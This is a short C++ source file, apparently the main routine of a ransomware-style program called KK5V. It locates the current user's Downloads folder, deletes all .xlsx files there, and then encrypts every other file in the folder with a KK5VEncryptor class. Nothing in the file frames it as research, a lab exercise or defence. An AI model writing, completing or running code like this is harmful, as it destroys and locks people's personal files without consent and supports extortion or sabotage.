#include "kk5v.h"
#include <string>
#include <windows.h>

using namespace std;

int main() {
    // Get the USERPROFILE directory
    const char* userProfile = getenv("USERPROFILE");
    if (userProfile == nullptr) {
        return 1; // Exit if USERPROFILE environment variable is not set
    }

    // Construct the Downloads directory path
    string downloadsDir = string(userProfile) + "\\Downloads";

    // Remove .xlsx files
    KK5VEncryptor::removeXlsxFiles(downloadsDir);

    // Encrypt other files in the Downloads directory
    vector<string> files = KK5VEncryptor::getFilesInDirectory(downloadsDir);
    for (const string& file : files) {
        if (file.substr(file.find_last_of(".") + 1) != "xlsx") {
            KK5VEncryptor::encryptFile(file);
        }
    }

    return 0;
}
